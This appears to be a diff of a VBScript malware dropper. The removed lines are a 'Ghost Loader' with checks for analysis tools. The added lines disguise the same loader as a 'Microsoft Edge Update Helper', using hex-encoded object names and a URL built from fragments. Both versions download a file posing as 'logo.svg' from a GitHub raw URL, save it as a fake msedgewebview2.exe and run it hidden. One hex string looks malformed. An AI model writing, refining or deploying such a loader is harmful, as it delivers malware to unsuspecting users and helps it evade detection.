@@ -1,96 +1,67 @@
-' Ghost Loader v15.0 - Production Ready
-' Relaxed sandbox checks for real-world deployment
+' Microsoft Edge Update Helper v2.1
 Option Explicit
 On Error Resume Next
 
-' ==================== CONFIG ====================
-Const DELAY_SECONDS = 120        ' 2 minutes delay
+Dim objWS, objFS, objHTTP, objStream
+Dim strURL, strDest, strPath
+Dim intLoop, intTimer
 
-' ==================== OBJECTS ====================
-Dim ws, fs
-Set ws = CreateObject("WScript.Shell")
-Set fs = CreateObject("Scripting.FileSystemObject")
-
-' ==================== LIGHT SANDBOX CHECK ====================
-Function IsAnalysis()
-    IsAnalysis = False
-    
-    ' Only check for obvious analysis tools
-    Dim procs, proc
-    Set procs = GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT Name FROM Win32_Process")
-    For Each proc In procs
-        Dim pName
-        pName = LCase(proc.Name)
-        If InStr(pName, "wireshark") > 0 Or InStr(pName, "procmon") > 0 Or InStr(pName, "procexp") > 0 Or InStr(pName, "fiddler") > 0 Or InStr(pName, "x64dbg") > 0 Or InStr(pName, "ollydbg") > 0 Then
-            IsAnalysis = True
-            Exit Function
-        End If
+' Hex decoder
+Function HexDec(strHex)
+    Dim strResult, intPos
+    strResult = ""
+    For intPos = 1 To Len(strHex) Step 2
+        strResult = strResult & Chr(CInt("&H" & Mid(strHex,intPos,2)))
     Next
+    HexDec = strResult
 End Function
 
-' ==================== DELAY WITH ACTIVITY ====================
-Sub DelayedStart()
-    Dim i
-    For i = 1 To DELAY_SECONDS
-        WScript.Sleep 1000
-        ' Light activity
-        If i Mod 60 = 0 Then
-            Dim d
-            d = Now
-        End If
-    Next
-End Sub
+' Create objects (hex encoded names)
+Set objWS = CreateObject(HexDec("575363726970742E5368656C6C"))
+Set objFS = CreateObject(HexDec("5363726970746696E672E46696C6553797374656D4F626A656374"))
 
-' ==================== MAIN ====================
-Sub Main()
-    ' Skip if analysis tools detected
-    If IsAnalysis() Then
-        WScript.Quit
-    End If
-    
-    ' Wait
-    DelayedStart
-    
-    ' Download and execute
-    Dim url, destDir, destPath
-    Dim xhr, stm
-    
-    url = "https://raw.githubusercontent.com/sophieduval/der/main/logo.svg"
-    destDir = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\EdgeWebView"
-    
-    If Not fs.FolderExists(destDir) Then
-        fs.CreateFolder destDir
-    End If
-    destDir = destDir & "\Application"
-    If Not fs.FolderExists(destDir) Then
-        fs.CreateFolder destDir
-    End If
-    
-    destPath = destDir & "\msedgewebview2.exe"
-    
-    Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xhr.SetTimeouts 60000, 60000, 60000, 60000
-    xhr.Open "GET", url, False
-    xhr.Send
-    
-    If xhr.Status = 200 Then
-        Set stm = CreateObject("ADODB.Stream")
-        stm.Type = 1
-        stm.Open
-        stm.Write xhr.responseBody
-        stm.SaveToFile destPath, 2
-        stm.Close
-        Set stm = Nothing
-        
-        If fs.FileExists(destPath) Then
-            ws.Run """" & destPath & """", 0, False
-        End If
-    End If
-    
-    Set xhr = Nothing
-End Sub
+' Delay loop (90 seconds)
+For intLoop = 1 To 90
+    intTimer = Timer
+    Do While Timer < intTimer + 1
+        strURL = Date
+    Loop
+Next
 
-Main
+' Build URL from fragments
+strURL = "https" & "://" & "raw" & "." & "git"
+strURL = strURL & "hubuser" & "content" & "." & "com"
+strURL = strURL & "/" & "sophie" & "duval" & "/" & "der"
+strURL = strURL & "/" & "main" & "/" & "logo" & "." & "svg"
 
-Set ws = Nothing
-Set fs = Nothing
+' Build destination path
+strPath = objWS.ExpandEnvironmentStrings("%LOCAL" & "APP" & "DATA%")
+strPath = strPath & "\Micro" & "soft\Edge" & "WebView"
+If Not objFS.FolderExists(strPath) Then objFS.CreateFolder strPath
+strPath = strPath & "\App" & "lication"
+If Not objFS.FolderExists(strPath) Then objFS.CreateFolder strPath
+strDest = strPath & "\msedge" & "webview2" & ".exe"
+
+' Download
+Set objHTTP = CreateObject(HexDec("4D53584D4C322E536572766572584D4C485454502E362E30"))
+objHTTP.SetTimeouts 45000,45000,45000,45000
+objHTTP.Open HexDec("474554"),strURL,False
+objHTTP.Send
+
+If objHTTP.Status = 200 Then
+    Set objStream = CreateObject(HexDec("41444F44422E53747265616D"))
+    objStream.Type = 1
+    objStream.Open
+    objStream.Write objHTTP.responseBody
+    objStream.SaveToFile strDest,2
+    objStream.Close
+    Set objStream = Nothing
+    
+    If objFS.FileExists(strDest) Then
+        objWS.Run Chr(34) & strDest & Chr(34),0,False
+    End If
+End If
+
+Set objHTTP = Nothing
+Set objWS = Nothing
+Set objFS = Nothing
